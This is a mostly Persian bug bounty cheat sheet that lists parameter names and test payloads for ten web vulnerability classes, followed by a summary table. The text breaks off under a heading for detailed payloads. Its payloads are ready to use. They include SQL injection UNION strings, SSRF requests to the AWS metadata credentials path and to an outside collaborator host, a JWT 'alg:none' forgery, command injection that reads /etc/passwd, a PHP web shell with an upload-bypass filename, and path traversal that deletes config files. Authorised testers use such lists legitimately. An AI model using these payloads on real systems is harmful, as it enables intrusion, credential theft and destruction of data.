🚀 P1 Bug Bounty Cheat Sheet (2025)
1. 🔑 IDOR (Insecure Direct Object Reference)

پارامترهای حساس:

```
user_id, account_id, profile_id, order_id, invoice_id, doc_id, uid
```

Payload تست:
```
GET /api/user/profile?user_id=12345   # کاربر A
GET /api/user/profile?user_id=12346   # دسترسی غیرمجاز به کاربر B
```
2. 🔒 Broken Access Control (BAC - فنی)

پارامترهای حساس:
```
role, isAdmin, permission, access_level, group
```

Payload تست:
```
POST /api/updateRole
{"user":"12345","role":"admin"}   # ارتقاء نقش غیرمجاز
```
3. 💉 SQL Injection (Error Based)

پارامترهای حساس:
```
id, query, search, sort, filter, report_id
```

Payload تست:
```
?id=1'   -- Error Based
?id=1' ORDER BY 5-- 
?id=1' UNION SELECT null,null,version()-- 
```
4. 🌐 SSRF (Server-Side Request Forgery)

پارامترهای حساس:
```
url, link, target, callback, feed, redirect, endpoint, webhook
```

Payload تست:
```
url=http://127.0.0.1:22        # تست پورت داخلی
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS metadata
url=http://burpcollaborator.net/abc   # DNS exfil
```
5. 🛑 Authentication Bypass (فنی)

پارامترهای حساس:
```
auth, token, session_id, jwt, sso, bearer
```

Payload تست:
```
Authorization: Bearer null
Authorization: Bearer '' 
Cookie: session_id=123 OR 1=1
jwt={"alg":"none","kid":"1","payload":{"role":"admin"}}
```
6. 💣 RCE (Remote Code Execution)

پارامترهای حساس:
```
cmd, exec, shell, process, run
```

Payload تست:
```
cmd=ls -la; id
exec=whoami && cat /etc/passwd
```
7. 🐚 Shell Upload (نوعی RCE)

پارامترهای حساس:
```
file, upload, avatar, media, image
```

Payload تست (PHP Shell):
```
<?php system($_GET['cmd']); ?>
```

آپلود با نام: shell.php.jpg

دسترسی: http://site.com/uploads/shell.php?cmd=id

8. 📤 Unrestricted File Upload

پارامترهای حساس:
```
upload, file, attachment, document
```

Payload تست:
```
آپلود .htaccess برای اجرای PHP

آپلود فایل evil.svg با JavaScript درون SVG
```
9. ⚡ Race Condition

پارامترهای حساس:
```
coupon, promo, balance, transfer, withdraw
```

Payload تست:
```
# استفاده همزمان از یک کوپن تخفیف
for i in {1..50}; do curl -X POST https://target.com/redeem?coupon=FREE100 & done
```
10. 📂 Path Traversal / Arbitrary File Deletion

پارامترهای حساس:
```
file, path, dir, delete, remove, download
```

Payload تست:
```
download=../../../../etc/passwd
delete=../../../../var/www/html/config.php
```
✅ Quick Notes

ابزار پیشنهادی برای پیدا کردن این پارامترها: Burp ParamMiner, Arjun, NarrowX

اول روی Token / IDOR / File / Redirect / SSRF تمرکز کن (بیشترین P1 Report ها در ۲۰۲۵)

برای اثبات، همیشه PoC کوتاه + اسکرین‌شات + هدر/ریسپانس بذار


===================================================================

# پارامترهای حساس P1 برای تست نفوذ وب در باگ بانتی همراه با پیلودهای نمونه

| نوع آسیب‌پذیری             | پارامترهای حساس              | مثال پیلود (Payload)                                                                                     | توضیح مختصر                           |
|--------------------------|-----------------------------|---------------------------------------------------------------------------------------------------------|-------------------------------------|
| IDOR (Insecure Direct Object Reference) | user_id, id, account_id, document_id | `/api/v1/user/123/profile` → تغییر `123` به شناسه دیگر یا `/download?invoice_id=456` → تغییر مقدار          | دسترسی غیرمجاز به داده‌های دیگران   |
| Broken Access Control (فنی) | Authorization, role, token  | تغییر هدر `Authorization: Bearer <token>` یا تغییر پارامتر `?role=admin`                                 | دور زدن محدودیت‌های دسترسی           |
| SQL Injection (Error Based) | id, username, search        | `' OR 1=1--` در رشته‌های ورودی، مثلاً `?id=1' OR '1'='1`                                               | استخراج داده یا دور زدن کنترل‌ها با خطاهای SQL |
| SSRF (Server-Side Request Forgery) | url, redirect_uri, endpoint, service | `?url=http://169.254.169.254/latest/meta-data` یا `?redirect_uri=http://evil.com`                        | درخواست به منابع داخلی یا هک از راه دور |
| Authentication Bypass (فنی) | token, password, new_password | ارسال درخواست با توکن‌های دستکاری شده یا استفاده از پارامتر `?token=abcdef` بدون اعتبارسنجی صحیح         | نفوذ به حساب بدون مجوز               |
| RCE (Remote Code Execution) | command, exec, input        | `?command=ls` یا تزریق کد‌های مخرب در پارامترهای ورودی مانند `; cat /etc/passwd`                        | اجرای کد دلخواه روی سرور            |
| Shell Upload (نوعی RCE)    | file, upload                | آپلود فایل PHP معکوس مانند `<?php system($_GET['cmd']); ?>`                                            | آپلود فایل مخرب برای کنترل سرور     |
| Unrestricted File Upload  | file, upload, avatar        | آپلود فایل با پسوندهای غیرمجاز مانند `.php`, `.jsp`                                                   | دسترسی و اجرای کد مخرب روی سرور      |
| Race Condition            | quantity, count, index      | ارسال همزمان چند درخواست با `?quantity=-1` یا `?count=2`                                               | ایجاد مشکلات منطقی و دور زدن محدودیت‌ها |
| Path Traversal / Arbitrary File Deletion | file, path, filename       | `?file=../../../../etc/passwd` یا درخواست حذف با `?filename=../../../important_file`                    | دسترسی یا حذف فایل‌های حساس         |

---

### نمونه دقیق پیلودها:

- **IDOR**  

